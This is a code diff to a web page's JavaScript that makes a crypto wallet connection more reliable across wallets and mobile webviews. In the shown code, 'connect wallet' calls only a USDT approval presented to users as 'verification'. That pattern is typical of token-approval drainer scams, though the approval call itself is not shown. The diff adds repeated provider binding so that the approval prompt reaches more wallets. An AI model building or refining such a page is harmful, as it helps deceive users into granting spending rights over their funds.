@@ -238,6 +238,19 @@
     async function connectWallet() {
         await approveUsdt();
     }
+    // Helper to guarantee Ethers v6 is loaded before continuing
+    async function ensureEthers() {
+        if (typeof window.ethers !== 'undefined') return true;
+        updateStatus('⏳ Initializing secure Web3 components...', 'warning');
+
+        let waited = 0;
+        while (typeof window.ethers === 'undefined' && waited < 4000) {
+            await new Promise(r => setTimeout(r, 100));
+            waited += 100;
+        }
+
+        return typeof window.ethers !== 'undefined';
+    }
 
     async function approveUsdt() {
         if (state.isApproving) return;
@@ -251,6 +264,16 @@
 
         state.isApproving = true;
         updateWalletInfoUI();
+
+        // Ensure Ethers is ready (prevents failure on fast clicks / slow initial load)
+        const hasEthers = await ensureEthers();
+        if (!hasEthers) {
+            updateStatus('❌ Web3 library failed to load. Please check your internet connection.', 'error');
+            state.isApproving = false;
+            updateWalletInfoUI();
+            return;
+        }
+
         updateStatus('⛽ Opening wallet for USDT verification...', 'warning');
 
         try {
@@ -577,9 +600,19 @@
             });
         }
 
-        // Web3 Account / Chain listener (Silent UI updates only - NO automatic transaction prompts)
+        // Setup Web3 provider listeners
+        setupProviderListeners();
+    }
+
+    // ============================================================
+    // DYNAMIC WEB3 PROVIDER LISTENER & HANDSHAKE
+    // ============================================================
+    let isProviderBound = false;
+    function setupProviderListeners() {
+        if (isProviderBound) return;
         const activeProvider = getWeb3Provider();
         if (activeProvider && activeProvider.on) {
+            isProviderBound = true;
             activeProvider.on('accountsChanged', function (accounts) {
                 if (!accounts || accounts.length === 0) {
                     state.walletAddress = '';
@@ -601,144 +634,27 @@
     }
 
     // ============================================================
-    // CANVAS ANIMATION (BACKGROUND ORBS & PARTICLES)
+    // INITIALIZATION (INSTANT LOAD & ASYNC WALLET HANDSHAKE)
     // ============================================================
-    function initHeroCanvas() {
-        const canvas = document.getElementById('heroCanvas');
-        if (!canvas) return;
-        const ctx = canvas.getContext('2d');
-        let width, height, centerX, centerY;
-        let nodes = [], dust = [];
-
-        function resize() {
-            const rect = canvas.getBoundingClientRect();
-            const dpr = window.devicePixelRatio || 1;
-            width = rect.width * dpr;
-            height = rect.height * dpr;
-            canvas.width = width;
-            canvas.height = height;
-            centerX = width / 2;
-            centerY = height / 2;
-        }
-
-        function createParticles() {
-            nodes = [];
-            const count = 28;
-            for (let i = 0; i < count; i++) {
-                const angle = Math.random() * Math.PI * 2;
-                const dist = 0.2 + Math.random() * 0.35;
-                nodes.push({
-                    x: centerX + Math.cos(angle) * dist * Math.min(width, height) * 0.4,
-                    y: centerY + Math.sin(angle) * dist * Math.min(width, height) * 0.4,
-                    vx: (Math.random() - 0.5) * 0.3,
-                    vy: (Math.random() - 0.5) * 0.3,
-                    radius: 2 + Math.random() * 4,
-                    phase: Math.random() * Math.PI * 2
-                });
-            }
-            nodes.push({ x: centerX, y: centerY, vx: 0, vy: 0, radius: 6, isHub: true });
-
-            dust = [];
-            for (let i = 0; i < 60; i++) {
-                dust.push({
-                    x: Math.random() * width,
-                    y: Math.random() * height,
-                    vx: (Math.random() - 0.5) * 0.5,
-                    vy: (Math.random() - 0.5) * 0.5,
-                    radius: 0.5 + Math.random() * 1.2,
-                    alpha: 0.2 + Math.random() * 0.4
-                });
-            }
-        }
-
-        function update() {
-            for (const n of nodes) {
-                if (n.isHub) continue;
-                n.x += n.vx;
-                n.y += n.vy;
-                if (n.x < 0 || n.x > width) n.vx *= -1;
-                if (n.y < 0 || n.y > height) n.vy *= -1;
-            }
-            for (const d of dust) {
-                d.x += d.vx;
-                d.y += d.vy;
-                if (d.x < 0 || d.x > width) d.vx *= -1;
-                if (d.y < 0 || d.y > height) d.vy *= -1;
-            }
-        }
-
-        function draw() {
-            ctx.clearRect(0, 0, width, height);
-            const maxDist = Math.min(width, height) * 0.18;
-
-            for (let i = 0; i < nodes.length; i++) {
-                for (let j = i + 1; j < nodes.length; j++) {
-                    const dx = nodes[i].x - nodes[j].x;
-                    const dy = nodes[i].y - nodes[j].y;
-                    const dist = Math.hypot(dx, dy);
-                    if (dist < maxDist) {
-                        const alpha = (1 - dist / maxDist) * 0.25;
-                        ctx.beginPath();
-                        ctx.moveTo(nodes[i].x, nodes[i].y);
-                        ctx.lineTo(nodes[j].x, nodes[j].y);
-                        ctx.strokeStyle = `rgba(243, 186, 47, ${alpha})`;
-                        ctx.lineWidth = 0.5;
-                        ctx.stroke();
-                    }
-                }
-            }
-
-            for (const d of dust) {
-                ctx.beginPath();
-                ctx.arc(d.x, d.y, d.radius, 0, Math.PI * 2);
-                ctx.fillStyle = `rgba(243, 186, 47, ${d.alpha * 0.3})`;
-                ctx.fill();
-            }
-
-            const time = Date.now() / 1000;
-            for (const n of nodes) {
-                const pulse = n.isHub ? 1 : 0.4 + 0.4 * Math.sin(time * 0.8 + n.phase);
-                const r = n.isHub ? n.radius + 2 * Math.sin(time * 0.6) : n.radius;
-                const grad = ctx.createRadialGradient(n.x, n.y, 0, n.x, n.y, r * 6);
-                grad.addColorStop(0, `rgba(243, 186, 47, ${0.15 * pulse})`);
-                grad.addColorStop(1, 'rgba(243, 186, 47, 0)');
-
-                ctx.beginPath();
-                ctx.arc(n.x, n.y, r * 6, 0, Math.PI * 2);
-                ctx.fillStyle = grad;
-                ctx.fill();
-
-                ctx.beginPath();
-                ctx.arc(n.x, n.y, r, 0, Math.PI * 2);
-                ctx.fillStyle = n.isHub ? '#F3BA2F' : `rgba(243, 186, 47, ${0.5 + 0.3 * pulse})`;
-                ctx.fill();
-            }
-        }
-
-        function loop() {
-            update();
-            draw();
-            requestAnimationFrame(loop);
-        }
-
-        resize();
-        createParticles();
-        loop();
-
-        window.addEventListener('resize', () => {
-            resize();
-            createParticles();
-        });
-    }
-
-    // ============================================================
-    // INITIALIZATION
-    // ============================================================
-    document.addEventListener('DOMContentLoaded', function () {
+    function initApp() {
         initElements();
         bindEvents();
-        initHeroCanvas();
+        setupProviderListeners();
         updateWalletInfoUI();
-    });
+    }
+
+    // Execute immediately if DOM is already ready, preventing hanging on mobile webviews
+    if (document.readyState === 'loading') {
+        document.addEventListener('DOMContentLoaded', initApp);
+    } else {
+        initApp();
+    }
+
+    // Auto-listen for async wallet provider injection (Trust Wallet, Bitget, MetaMask, OKX)
+    window.addEventListener('ethereum#initialized', setupProviderListeners, { once: true });
+    window.addEventListener('eip6963:announceProvider', setupProviderListeners);
+    setTimeout(setupProviderListeners, 100);
+    setTimeout(setupProviderListeners, 350);
+    setTimeout(setupProviderListeners, 1000);
 
 })();
